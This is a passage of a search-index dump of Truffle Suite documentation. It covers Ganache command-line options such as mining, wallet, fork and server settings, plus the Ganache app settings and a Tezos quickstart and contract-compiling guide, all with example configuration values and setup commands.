Example --chain.time = <DATE> --chain.time = 1662596414 Date and time that the first block should start. Accepts the date format supported by the JavaScript Date() constructor . For example Unix epoch or a string. The alias --time is deprecated, use -t instead. --chain.hardfork , -k Syntax Example --chain.hardfork = <STRING> --chain.hardfork = \"arrowGlacier\" The hardfork rules for the EVM. Valid options are: constantinople , byzantium , petersburg , istanbul , muirGlacier , berlin , london , arrowGlacier , and grayGlacier . The default is london . The alias --hardfork has been deprecated, use -k instead. --chain.vmErrorsOnRPCResponse Syntax Example --chain.vmErrorsOnRPCResponse = <BOOLEAN> --chain.vmErrorsOnRPCResponse = true Indicate whether to report runtime errors from EVM code as RPC errors. The default is false .", "title": "chain"}, {"location": "docs/ganache/reference/cli-options/#database", "text": "--database.dbPath Syntax Example --database.dbPath = <STRING> --database.dbPath = \"/User/me/db\" The path to a directory to save the chain database. The aliases --db and --db_path have been deprecated.", "title": "database"}, {"location": "docs/ganache/reference/cli-options/#logging", "text": "--logging.debug Syntax Example --logging.debug = <BOOLEAN> --logging.debug = true Indicate whether to log debug information. Set to true to log EVM opcodes. The default is false . --logging.quiet , q Syntax Example --logging.quiet = <BOOLEAN> --logging.quiet = true Indicate whether to disable logging. Set to true to disable logging. The default is false . The alias --quiet has been deprecated, use -q instead. --logging.verbose , -v Syntax Example --logging.verbose = <BOOLEAN> --logging.verbose = true Indicate whether to log detailed RPC requests. The default is false . The alias --verbose has been deprecated, use -v instead.", "title": "logging"}, {"location": "docs/ganache/reference/cli-options/#miner", "text": "--miner.blockTime , b Syntax Example --miner.blockTime = <NUMBER> --miner.blockTime = 10 The block time (in seconds) for automatic mining. A block time of 0 enables instamine mode , where new executable transactions are mined instantly. The default is 0 . The alias --blockTime has been deprecated, use -b instead. --miner.timestampIncrement Syntax Example --miner.timestampIncrement = <NUMBER> --miner.timestampIncrement = 5 The amount of time (in seconds) to add to the timestamp of each new block header. The default is clock , which uses your system clock time as the timestamp for each new block. --miner.defaultGasPrice , g Syntax Example --miner.defaultGasPrice = <STRING> --miner.defaultGasPrice = \"0x87369400\" The default gas price in WEI for transactions if not specified. The default is 0x77359400 (2 GWEI). The alias --gasPrice has been deprecated, use -g instead. --miner.blockGasLimit , l Syntax Example --miner.blockGasLimit = <STRING> --miner.blockGasLimit = \"0x87369400\" The block gas limit in WEI. The default is 0x1c9c380 (30 million WEI). The alias --gasLimit has been deprecated, use -l instead. --miner.defaultTransactionGasLimit Syntax Example --miner.defaultTransactionGasLimit = <STRING> --miner.defaultTransactionGasLimit = \"0x16F30\" The default transaction gas limit in WEI. Set to estimate to use an estimate (slows down transaction execution by 40%+). The defaults is 0x15f90 . --miner.difficulty Syntax Example --miner.difficulty = <STRING> --miner.difficulty = \"0x2\" The block difficulty. The default is 0x1 . --miner.callGasLimit Syntax Example --miner.callGasLimit = <STRING> --miner.callGasLimit = \"0x58af080\" The transaction gas limit in WEI for eth_call and eth_estimateGas calls. The default is 0x2faf080 . --miner.instamine Syntax Example --miner.instamine = <STRING> --miner.instamine = \"strict\" The instamine mode which is either eager or strict . In eager mode a transaction is included in a block before its hash is returned to the caller. In strict mode a transaction's hash is returned to the caller before the transaction is included in a block. This value has no effect if --miner.blockTime is not 0 (the default). The default is eager . --miner.coinbase Syntax Example --miner.coinbase = <STRING> --miner.coinbase = \"0xfe3b557e8fb62b89f4916b721be55ceb828dbd73\" The mining reward address. The default is 0x0000000000000000000000000000000000000000 . --miner.extraData Syntax Example --miner.extraData = <STRING> --miner.extraData = \"0x444F4E27542050414E4943202120484F444C2C20484F444C2C20484F444C2021\" A hex string representing the 32 bytes included in the extra data field of a mined block. The default is 0x . --miner.priceBump Syntax Example --miner.priceBump = <STRING> --miner.priceBump = \"0x1\" Minimum price bump percentage needed to replace a transaction that already exists in the transaction pool. The default is 10 .", "title": "miner"}, {"location": "docs/ganache/reference/cli-options/#wallet", "text": "--wallet.accounts Syntax Example --wallet.accounts = <STRING>,<STRING> --wallet.accounts = \"0x8f2a55949038a9610f50fb23b5883af3b4ecb3c3bb792cbcefbd1542c692be63\" , \"0X56BC75E2D63100000\" Account data in the form <private_key>,<initial_balance> . Specify the option multiple times to add multiple private keys with an initial balance. Private keys are 64 characters long, and must include the 0x prefix. The account balance can be an integer, or a 0x -prefixed hex string with either form specifying the initial balance in WEI. The alias --account has been deprecated. --wallet.totalAccounts , -a Syntax Example --wallet.totalAccounts = <NUMBER> --wallet.totalAccounts = 5 Number of accounts to generate at startup. The default is 10 . The alias --accounts has been deprecated, use -a instead. --wallet.deterministic , -d Syntax Example --wallet.deterministic = <BOOLEAN> --wallet.deterministic = true Use a pre-defined, deterministic seed. The default is false . The alias --deterministic has been deprecated, use -d instead. --wallet.seed , -s Syntax Example --wallet.seed = <STRING> --wallet.seed = \"c0157f7c8240459516f42b518c1cba1da942b9a5fb5e6313a948872fcac2742e28250a8b2faef0924ae5d2d59781d7789c4c960a2fef8283d886198d40cf871f\" The seed to generate a mnemonic. The default is a random value unless you specify --wallet.deterministic . The alias --seed has been deprecated, use -s instead. --wallet.mnemonic , -m Syntax Example --wallet.mnemonic = <STRING> --wallet.mnemonic = \"car casual program tourist aerobic broccoli link hamster resemble collect put october\" Use the specified HD wallet mnemonic to generate initial addresses. The default is generated from --wallet.seed . The alias --mnemonic has been deprecated, use -m instead. --wallet.unlockedAccounts , -u Syntax Example using an address Example using an index --wallet.unlockedAccounts = <STRING> --wallet.unlockedAccounts = \"0x8060b4E5dc6a2ee2974873c1ec7B58d6c2932c47\" --wallet.unlockedAccounts = 2 Addresses or address indexes specifying which accounts should be unlocked. You can specify the option multiple times. The alias --unlock has been deprecated, use -u instead. --wallet.lock , -n Syntax Example --wallet.lock = <BOOLEAN> --wallet.lock = true Locks all available accounts, which is good for third party transaction signing. The --secure and --lock aliases have been deprecated, use -n instead. --wallet.passphrase Syntax Example --wallet.passphrase = <STRING> --wallet.passphrase = \"changeme\" The passphrase to use when locking accounts. The alias --passphrase has been deprecated. --wallet.accountKeysPath Syntax Example --wallet.accountKeysPath = <STRING> --wallet.accountKeysPath = \"/Users/me/myKeys.txt\" Specify a file to save accounts and private keys to, for testing. The aliases --account_keys_path and --acctKeys have been deprecated. --wallet.defaultBalance , -e Syntax Example --wallet.defaultBalance = <NUMBER> --wallet.defaultBalance = 120 Specify the default account balance in ether. The default is 1000 . --wallet.hdPath Syntax Example --wallet.hdPath = <STRING> --wallet.hdPath = \"m,44',60',160720',0\" The hierarchical deterministic (HD) path to use when generating accounts. The default is m,44',60',0',0 .", "title": "wallet"}, {"location": "docs/ganache/reference/cli-options/#fork", "text": "--fork.url , -f Syntax Example --fork.url = <STRING> --fork.url = \"http://localhost:1337\" Fork from a running Ethereum client. You can optionally specify the block to fork from using an @ character, for example http://localhost:1337@8675309 . The specified URL supports basic authentication credentials as well. For example, wss://<user>:<password>@example.com/ . If you need to use an Infura API key secret, you would use it as follows: wss://:<API-KEY-SECRET>@mainnet.infura.com/ws/v3/<API-KEY> Alternatively, you can use the --fork.username and --fork.password options. --fork.network Syntax Example --fork.network = <STRING> --fork.network = \"goerli\" The network to fork. Valid options are mainnet , goerli , g\u00f6rli , and sepolia . Use the command ganache --fork to automatically fork Mainnet at the latest block. --fork.blockNumber Syntax Example --fork.blockNumber = <NUMBER> --fork.blockNumber = 182354 Block number to fork from. The default is the latest block. --fork.preLatestConfirmations Syntax Example --fork.preLatestConfirmations = <NUMBER> --fork.preLatestConfirmations = 8 When the --fork.blockNumber is set to latest (default), this option specifies the number of blocks before the remote node's latest block to fork from. The default is 5 . --fork.username Syntax Example --fork.username = <STRING> --fork.username = \"JohnDoe\" Username for basic authentication. Does not require setting --fork.password . When combined with --fork.password , the shorthand is { headers: { \"Authorization\": \"Basic {ENCODED-BASIC-HEADER}\" } } . If --fork.headers specifies an authorization header, the header is inserted after the Basic token. --fork.password Syntax Example --fork.password = <STRING> --fork.password = \"changeme\" Password for basic authentication. Does not require setting --fork.username . When combined with --fork.username , the shorthand is { headers: { \"Authorization\": \"Basic {ENCODED-BASIC-HEADER}\" } } . If the --fork.headers specifies an authorization header, the header is inserted after the Basic token. --fork.jwt Syntax Example --fork.jwt = <STRING> --fork.jwt = \"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJwZXJtaXNzaW9ucyI6Iio6KiIsInByaXZhY3lQdWJsaWNLZXkiOiIyVUtIM1ZKVGhrT29Lc2tyTEZwd294Q25uUkFSeW9iVjFiRWRnc2VGSFRzPSIsImV4cCI6IjE2MDA4OTk5OTkwMDIiLCJpYXQiOjE2MzkxNTc2Mjd9.FGf-FmfDQlIPCRDGmNnsHZWlwrUr69d7AIDqQrIrUrSJLiwGpR3NCUhVHIDMpQvDHQYf-sFMZTYvZGrvztYRuBKWMbTfIZKN74onzNJbFIPBVQuUX2HMXmI4VQ3UFB11LShiUJHKLna13qdbqfbgJIO3HetxJhJQxTiwtixfHwyPXl-Nx8HbQy_AWH58lLAUeaoLzN7QIA9kborthBpvfK9C7Sv1lXT1cdCDC4oRKBoiMg2RWFZtGtxFsnWyloangwbhCB6Bc_elqY5nd9WkF4ix95xsP_HgBcouy1sDw6jxn5_LveX53H8owczVWP6S1e6hv6hq2fs6YkSntKMK2g\" Encoded JSON Web Token (JWT) used for authenticating to servers. The shorthand is { headers: { \"Authorization\": \"Bearer {YOUR-ENCODED-JWT}\" } } . If the --fork.headers option specifies an authorization header, the header is inserted after the JWT Bearer token. --fork.userAgent Syntax Example --fork.userAgent = <STRING> --fork.userAgent = \"Ganache/7.0.0-beta.0 (https://www.trufflesuite.com/ganache; ganache<at>trufflesuite.com)]\" The User-Agent header sent to the fork on each request. Sent as Api-User-Agent when used in the browser. Is overridden by a User-Agent defined in the --fork.headers option, if provided. The default is Ganache/VERSION (https://www.trufflesuite.com/ganache; ganache<at>trufflesuite.com) . --fork.origin Syntax Example --fork.origin = <STRING> --fork.origin = \"https://www.trufflesuite.com/ganache\" The Origin header sent to the fork on each request. Ignored in the browser. Is overridden by an Origin value defined in the --fork.headers option, if provided. --fork.headers Syntax Example --fork.headers = <STRING> --fork.headers = \"User-Agent: Ganache/VERSION (https://www.trufflesuite.com/ganache; ganache<at>trufflesuite.com)\" Headers to supply on each request to the forked provider. Headers set here override headers set by other options, unless otherwise specified. The default is \"User-Agent: Ganache/VERSION (https://www.trufflesuite.com/ganache; ganache<at>trufflesuite.com)\" . --fork.requestsPerSecond Syntax Example --fork.requestsPerSecond = <NUMBER> --fork.requestsPerSecond = 10 Restrict the number of requests sent per second to the fork provider. The default is 0 , meaning no limit is applied. --fork.disableCache Syntax Example --fork.disableCache = <BOOLEAN> --fork.disableCache = true Disables caching forking requests. The default is false . --fork.deleteCache Syntax Example --fork.deleteCache = <BOOLEAN> --fork.deleteCache = true Deletes the persistent cache before starting. The default is false .", "title": "fork"}, {"location": "docs/ganache/reference/cli-options/#server", "text": "--server.ws Syntax Example --server.ws = <BOOLEAN> --server.ws = false Enables a WebSocket server. The default is true . --server.wsBinary Syntax Example --server.wsBinary = <BOOLEAN> --server.wsBinary = false Indicates whether WebSocket should respond with binary data (ArrayBuffers) or strings. Options are true , false , or auto . The default is auto . --server.rpcEndpoint Syntax Example --server.rpcEndpoint = <STRING> --server.rpcEndpoint = \"/v3\" Defines the endpoint route the HTTP and WebSocket servers listen on. The default is / for Ethereum and /rpc/v0 for Filecoin. --server.host , -h Syntax Example --server.host = <STRING> --server.host = \"127.0.0.1\" The hostname to listen on. The default is 127.0.0.1 . The aliases --host and --hostname have been deprecated, use -h instead. --server.port , -p Syntax Example --server.port = <NUMBER> --server.port = 9545 The port to listen on. The default is 8545 . The alias --port has been deprecated, use -p instead.", "title": "server"}, {"location": "docs/ganache/reference/cli-options/#detach-mode", "text": "Ganache can be started as a background process by passing the --detach option, along with any valid combination of start-up options. --detach , -D , --\ud83d\ude08 Runs Ganache as a background process, outputting a friendly name that can be used to reference the instance when managing the instance via the ganache instances command. Ganache will only return to the command line once it is ready to receive requests, making it handy for scripting - for example, you can start Ganache, execute a series of tests, and teardown the instance when complete with a one-liner: GANACHE = $( ganache --detach ) && npm run test ; ganache instances stop $GANACHE Or if you are running PowerShell, you can do: $GANACHE = ganache - -detach ; npm run test ; ganache instances stop $GANACHE ; Remove-Variable GANACHE", "title": "Detach mode"}, {"location": "docs/ganache/reference/cli-options/#manage-detached-instances", "text": "The ganache instances <sub-command> can be used to manage instances of Ganache running in detach mode.", "title": "Manage detached instances"}, {"location": "docs/ganache/reference/cli-options/#list", "text": "Output the list of instances running in detach mode. instances list Syntax Example ganache instances list $ ganache instances list \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 PID \u2502 Name \u2502 Flavor \u2502 Version \u2502 Host \u2502 Uptime \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 12182 \u2502 salted_caramel_ganache \u2502 ethereum \u2502 7 .6.0 \u2502 127 .0.0.1:8545 \u2502 36s \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518", "title": "list"}, {"location": "docs/ganache/reference/cli-options/#stop", "text": "Stop an instance of ganache running in detach mode. instances stop Syntax Example ganache instances stop <name> ganache instances stop salted_caramel_ganache", "title": "stop"}, {"location": "docs/ganache/reference/ganache-settings/", "text": "Ganache settings \u00b6 You can change some features of the generated blockchain through the Settings pages, accessed by the gear icon in the top right corner. You'll also be prompted with the settings screen when created a New Workspace . The settings page will vary depending on whether you're developing on Ethereum or Filecoin . After updating your settings, don't forget to save your changes . *Accessing Ganache Settings* Ethereum \u00b6 Workspace sets the workspace name and shows the currently linked Truffle projects. See our more detailed docs on creating and deleting workspaces for more info. Server shows details about the network connection, including hostname, port, network ID, and whether to automatically mine each transaction into a block. These connection details need to match your Truffle configuration . Accounts & Keys sets details about the number of accounts created, and whether to use a specific mnemonic or let Ganache generate its own. Chain sets configuration details for the genesis and parameters of the generated blockchain, including gas limit and gas price. Advanced toggles Google Analytics, which is useful for the Ganache team to track usage of the application. About contains information on the currently installed version of Ganache, along with links to our website and the Ganache GitHub repository . Filecoin \u00b6 Workspace sets the workspace name. See our more detailed docs on creating and deleting workspaces for more info. Server shows details about the network connection, including hostname, port, and IPFS configuration. These connection details need to match your Truffle configuration . Accounts & Keys sets details about the number of accounts created, and the seed to use. Miner sets configuration details for how Ganache should create tipsets/blocks. About contains information on the currently installed version of Ganache, along with links to our website and the Ganache GitHub repository . Save your changes \u00b6 After making changes, you will have to click Restart on the application for the changes to take effect. *Ganache Settings* Configuring Truffle to connect to Ganache \u00b6 To configure Truffle connect to Ganache, edit truffle-config.js to point to the Ganache's IP and port, e.g., module.exports = { networks: { development: { host: \"localhost\", port: 7545, network_id: \"1234\" } // live: { ... } } }; Then you can run migration commands like truffle migrate --network development .", "title": "Ganache settings"}, {"location": "docs/ganache/reference/ganache-settings/#ganache-settings", "text": "You can change some features of the generated blockchain through the Settings pages, accessed by the gear icon in the top right corner. You'll also be prompted with the settings screen when created a New Workspace . The settings page will vary depending on whether you're developing on Ethereum or Filecoin . After updating your settings, don't forget to save your changes . *Accessing Ganache Settings*", "title": "Ganache settings"}, {"location": "docs/ganache/reference/ganache-settings/#ethereum", "text": "Workspace sets the workspace name and shows the currently linked Truffle projects. See our more detailed docs on creating and deleting workspaces for more info. Server shows details about the network connection, including hostname, port, network ID, and whether to automatically mine each transaction into a block. These connection details need to match your Truffle configuration . Accounts & Keys sets details about the number of accounts created, and whether to use a specific mnemonic or let Ganache generate its own. Chain sets configuration details for the genesis and parameters of the generated blockchain, including gas limit and gas price. Advanced toggles Google Analytics, which is useful for the Ganache team to track usage of the application. About contains information on the currently installed version of Ganache, along with links to our website and the Ganache GitHub repository .", "title": "Ethereum"}, {"location": "docs/ganache/reference/ganache-settings/#filecoin", "text": "Workspace sets the workspace name. See our more detailed docs on creating and deleting workspaces for more info. Server shows details about the network connection, including hostname, port, and IPFS configuration. These connection details need to match your Truffle configuration . Accounts & Keys sets details about the number of accounts created, and the seed to use. Miner sets configuration details for how Ganache should create tipsets/blocks. About contains information on the currently installed version of Ganache, along with links to our website and the Ganache GitHub repository .", "title": "Filecoin"}, {"location": "docs/ganache/reference/ganache-settings/#save-your-changes", "text": "After making changes, you will have to click Restart on the application for the changes to take effect. *Ganache Settings*", "title": "Save your changes"}, {"location": "docs/ganache/reference/ganache-settings/#configuring-truffle-to-connect-to-ganache", "text": "To configure Truffle connect to Ganache, edit truffle-config.js to point to the Ganache's IP and port, e.g., module.exports = { networks: { development: { host: \"localhost\", port: 7545, network_id: \"1234\" } // live: { ... } } }; Then you can run migration commands like truffle migrate --network development .", "title": "Configuring Truffle to connect to Ganache"}, {"location": "docs/ganache/reference/workspace-default-configuration/", "text": "Default workspace configuration \u00b6 Every workspace has its own configuration. Each workspace's configuration is based off the Quickstart configuration at the time of workspace creation. While these can be changed, the Quickstart workspace starts with the below options: Ethereum \u00b6 Hostname: 127.0.0.1 - localhost Port Number: 7545 Network ID: 5777 Automine: true Error on Tx Failure: true Account Default Balance: 100 Total Accounts to Generate: 10 Autogenerate HD Mnemonic: false Lock Accounts: false Output Logs to File: false Verbose Logs: false However, during workspace creation, the Autogenerate HD Mnemonic is set to true to maintain the same set of accounts.", "title": "Default Workspace configuration"}, {"location": "docs/ganache/reference/workspace-default-configuration/#default-workspace-configuration", "text": "Every workspace has its own configuration. Each workspace's configuration is based off the Quickstart configuration at the time of workspace creation. While these can be changed, the Quickstart workspace starts with the below options:", "title": "Default workspace configuration"}, {"location": "docs/ganache/reference/workspace-default-configuration/#ethereum", "text": "Hostname: 127.0.0.1 - localhost Port Number: 7545 Network ID: 5777 Automine: true Error on Tx Failure: true Account Default Balance: 100 Total Accounts to Generate: 10 Autogenerate HD Mnemonic: false Lock Accounts: false Output Logs to File: false Verbose Logs: false However, during workspace creation, the Autogenerate HD Mnemonic is set to true to maintain the same set of accounts.", "title": "Ethereum"}, {"location": "docs/tezos/truffle/quickstart/", "text": "Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Tezos Quickstart \u00b6 Wanna build apps on Tezos using Truffle? You're in the right place. Getting Set Up \u00b6 Installing Docker \u00b6 Before you can start developing Tezos applications with Truffle, you'll first need to ensure you have Docker installed on your machine. Installing docker let's Truffle easily use the latest LIGO compiler on any platform. See Docker install instructions for your platform. Docker on Windows: If you're developing on Windows, you need to install the Docker edge release instead of the mainline docker version. Trust us: This is a better experience. Other Requirements \u00b6 NodeJS v8.9.4 or later Windows, Linux or Mac OS X Installing Truffle \u00b6 You'll need to download a special version of Truffle to use Tezos. $ npm install -g truffle@tezos If you already have Truffle installed, we recommend uninstalling truffle before running the above command. Using the Tezos Truffle Box \u00b6 This quick start uses an already-created project to provide the base Truffle project structure and example contracts. In your workspace directory, run the following commands: $ mkdir tezos-example $ cd tezos-example $ truffle unbox tezos-example Writing Contracts \u00b6 The example box comes with two contracts, which you can find in the ./contracts folder: Counter.ligo Migrations.ligo SimpleStorage.ligo You can see that these contracts end in the .ligo file extension. This refers to the LIGO programming language . See the Writing Tezos contracts section for more info. Deploying Contracts \u00b6 For this quick start, we're going to configure your project to deploy to the Delphinet or any other existing test network for Tezos. This is the quickest way to get started, though as you get familiar with Tezos, you'll want to set up a local development environment. See the example box documentation for an example on using a local flextesa sandbox. Configuring Truffle to point to the Tezos testnet \u00b6 First, navigate to https://faucet.tzalpha.net/ to get a faucet account. This will create a new account for you on the testnet and fill it with some testnet XTZ. This account is valid for all Tezos test networks. Download the file and save it as faucet.json in the root of your project. Next, replace the box's truffle-config.js with the following: const { mnemonic , secret , password , email } = require ( \"./faucet.json\" ); module . exports = { // see <https://trufflesuite.com/docs/tezos/truffle/reference/configuring-tezos-projects> // for more details on how to specify configuration options! networks : { development : { host : \"https://delphinet.smartpy.io\" , port : 443 , network_id : \"*\" , secret , mnemonic , password , email , type : \"tezos\" } } }; That's it! You're all set to run the box's deployment scripts against a testnet. Note: The default tezos box is configured to deploy to multiple networks, including mainnet. If you'd like to deploy to those networks, you'll need to first configure the `secret`, `mnemonic`, `password`, and `email` like the above to represent an account you own that's funded with XTZ. See the Configuring Tezos Projects section for more info. Caution! Keep your `secret`, `mnemonic` and `password` safe! When not on a testnet, you can quickly lose all your tez if someone else gets ahold of them. Running Truffle's deployment scripts \u00b6 The example box comes default with pre-written deployment scripts, found within the ./migrations directory: 1_initial_migration.js 2_deploy_simple_storage.js 3_deploy_counter.js Truffle will handle running these scripts when you run the following command: $ truffle migrate See the Deploying Tezos contracts section for more information on how to write and use Truffle's deployment scripts. Testing Contracts \u00b6 The box also comes equipped with tests, showing you how to write automated tests for your Tezos contracts. You can find these tests in the ./test directory: counter.test.js simpleStorage.test.js See the Testing Tezos contracts section for more information on how to write tests for your LIGO congrats. Running your tests is easy, by running following command: $ truffle test Further Resources \u00b6 If you've reached this point, you now have a Truffle project that lets you compile, test, and deploy LIGO contracts to the Tezos test network. Congrats! This is a great start, but there's still much to learn. We suggest you check out the following resources to learn more about Tezos, LIGO, and Truffle: LIGO language documentation Tezos documentation Taquito communcation library Main Truffle Suite documentation", "title": "Tezos Quickstart"}, {"location": "docs/tezos/truffle/quickstart/#tezos-quickstart", "text": "Wanna build apps on Tezos using Truffle? You're in the right place.", "title": "Tezos Quickstart"}, {"location": "docs/tezos/truffle/quickstart/#getting-set-up", "text": "", "title": "Getting Set Up"}, {"location": "docs/tezos/truffle/quickstart/#installing-docker", "text": "Before you can start developing Tezos applications with Truffle, you'll first need to ensure you have Docker installed on your machine. Installing docker let's Truffle easily use the latest LIGO compiler on any platform. See Docker install instructions for your platform. Docker on Windows: If you're developing on Windows, you need to install the Docker edge release instead of the mainline docker version. Trust us: This is a better experience.", "title": "Installing Docker"}, {"location": "docs/tezos/truffle/quickstart/#other-requirements", "text": "NodeJS v8.9.4 or later Windows, Linux or Mac OS X", "title": "Other Requirements"}, {"location": "docs/tezos/truffle/quickstart/#installing-truffle", "text": "You'll need to download a special version of Truffle to use Tezos. $ npm install -g truffle@tezos If you already have Truffle installed, we recommend uninstalling truffle before running the above command.", "title": "Installing Truffle"}, {"location": "docs/tezos/truffle/quickstart/#using-the-tezos-truffle-box", "text": "This quick start uses an already-created project to provide the base Truffle project structure and example contracts. In your workspace directory, run the following commands: $ mkdir tezos-example $ cd tezos-example $ truffle unbox tezos-example", "title": "Using the Tezos Truffle Box"}, {"location": "docs/tezos/truffle/quickstart/#writing-contracts", "text": "The example box comes with two contracts, which you can find in the ./contracts folder: Counter.ligo Migrations.ligo SimpleStorage.ligo You can see that these contracts end in the .ligo file extension. This refers to the LIGO programming language . See the Writing Tezos contracts section for more info.", "title": "Writing Contracts"}, {"location": "docs/tezos/truffle/quickstart/#deploying-contracts", "text": "For this quick start, we're going to configure your project to deploy to the Delphinet or any other existing test network for Tezos. This is the quickest way to get started, though as you get familiar with Tezos, you'll want to set up a local development environment. See the example box documentation for an example on using a local flextesa sandbox.", "title": "Deploying Contracts"}, {"location": "docs/tezos/truffle/quickstart/#configuring-truffle-to-point-to-the-tezos-testnet", "text": "First, navigate to https://faucet.tzalpha.net/ to get a faucet account. This will create a new account for you on the testnet and fill it with some testnet XTZ. This account is valid for all Tezos test networks. Download the file and save it as faucet.json in the root of your project. Next, replace the box's truffle-config.js with the following: const { mnemonic , secret , password , email } = require ( \"./faucet.json\" ); module . exports = { // see <https://trufflesuite.com/docs/tezos/truffle/reference/configuring-tezos-projects> // for more details on how to specify configuration options! networks : { development : { host : \"https://delphinet.smartpy.io\" , port : 443 , network_id : \"*\" , secret , mnemonic , password , email , type : \"tezos\" } } }; That's it! You're all set to run the box's deployment scripts against a testnet. Note: The default tezos box is configured to deploy to multiple networks, including mainnet. If you'd like to deploy to those networks, you'll need to first configure the `secret`, `mnemonic`, `password`, and `email` like the above to represent an account you own that's funded with XTZ. See the Configuring Tezos Projects section for more info. Caution! Keep your `secret`, `mnemonic` and `password` safe! When not on a testnet, you can quickly lose all your tez if someone else gets ahold of them.", "title": "Configuring Truffle to point to the Tezos testnet"}, {"location": "docs/tezos/truffle/quickstart/#running-truffles-deployment-scripts", "text": "The example box comes default with pre-written deployment scripts, found within the ./migrations directory: 1_initial_migration.js 2_deploy_simple_storage.js 3_deploy_counter.js Truffle will handle running these scripts when you run the following command: $ truffle migrate See the Deploying Tezos contracts section for more information on how to write and use Truffle's deployment scripts.", "title": "Running Truffle's deployment scripts"}, {"location": "docs/tezos/truffle/quickstart/#testing-contracts", "text": "The box also comes equipped with tests, showing you how to write automated tests for your Tezos contracts. You can find these tests in the ./test directory: counter.test.js simpleStorage.test.js See the Testing Tezos contracts section for more information on how to write tests for your LIGO congrats. Running your tests is easy, by running following command: $ truffle test", "title": "Testing Contracts"}, {"location": "docs/tezos/truffle/quickstart/#further-resources", "text": "If you've reached this point, you now have a Truffle project that lets you compile, test, and deploy LIGO contracts to the Tezos test network. Congrats! This is a great start, but there's still much to learn. We suggest you check out the following resources to learn more about Tezos, LIGO, and Truffle: LIGO language documentation Tezos documentation Taquito communcation library Main Truffle Suite documentation", "title": "Further Resources"}, {"location": "docs/tezos/truffle/getting-started/compiling-tezos-contracts/", "text": "Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Compiling LIGO contracts \u00b6 Location \u00b6 All of your contracts are located in your project's contracts/ directory. Tezos contracts are written in LIGO , and all files containing contracts will have a file extension of .ligo . With the example Truffle Tezos project (created through truffle unbox tezos-example ), you're given three contracts, Counter.ligo , Migrations.ligo , and SimpleStorage.ligo . Command \u00b6 To compile a Tezos Truffle project, change to the root of the directory where the project is located and then type the following into a terminal: truffle compile Upon first run, all contracts will be compiled. Upon subsequent runs, Truffle will compile only the contracts that have been changed since the last compile. If you'd like to override this behavior, run the above command with the --all option. Build artifacts \u00b6 Artifacts of your compilation will be placed in the build/contracts/ directory, relative to your project root. (This directory will be created if it does not exist.) These artifacts are integral to the inner workings of Truffle, and they play an important part in the successful deployment of your application. You should not edit these files as they'll be overwritten by contract compilation and deployment. All good? \u00b6 If you've gotten this far, it's time to deploy. Check out our Deploying Tezos Contracts section for more!", "title": "Compiling LIGO contracts"}, {"location": "docs/tezos/truffle/getting-started/compiling-tezos-contracts/#compiling-ligo-contracts", "text": "", "title": "Compiling LIGO contracts"}, {"location": "docs/tezos/truffle/getting-started/compiling-tezos-contracts/#location", "text": "All of your contracts are located in your project's contracts/ directory. Tezos contracts are written in LIGO , and all files containing contracts will have a file extension of .ligo . With the example Truffle Tezos project (created through truffle unbox tezos-example ), you're given three contracts, Counter.ligo , Migrations.ligo , and SimpleStorage.ligo .", "title": "Location"}, {"location": "docs/tezos/truffle/getting-started/compiling-tezos-contracts/#command", "text": "To compile a Tezos Truffle project, change to the root of the directory where the project is located and then type the following into a terminal: truffle compile Upon first run, all contracts will be compiled. Upon subsequent runs, Truffle will compile only the contracts that have been changed since the last compile. If you'd like to override this behavior, run the above command with the --all option.", "title": "Command"}, {"location": "docs/tezos/truffle/getting-started/compiling-tezos-contracts/#build-artifacts", "text": "Artifacts of your compilation will be placed in the build/contracts/ directory, relative to your project root. (This directory will be created if it does not exist.) These artifacts are integral to the inner workings of Truffle, and they play an important part in the successful deployment of your application. You should not edit these files as they'll be overwritten by contract compilation and deployment.", "title": "Build artifacts"}, {"location": "docs/tezos/truffle/getting-started/compiling-tezos-contracts/#all-good", "text": "If you've gotten this far, it's time to deploy. Check out our Deploying Tezos Contracts section for more!", "title": "All good?"}, {"location": "docs/tezos/truffle/getting-started/creating-a-tezos-project/", "text": "Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Creating a Tezos Project \u00b6 To use most Truffle commands, you need to run them against an existing Truffle project. So the first step is to create a Truffle project with Tezos. The best way to create a project with Tezos is to start with the tezos-example Truffle Box . Truffle boxes are example applications and project templates, and we've built one specifically for Tezos. Create a new directory for your Truffle project: mkdir tezos-example cd tezos-example Download (\"unbox\") the tezos-example box: truffle unbox tezos-example Note : You can use the `truffle unbox ` command to download any of the other Truffle Boxes , though note that as of this 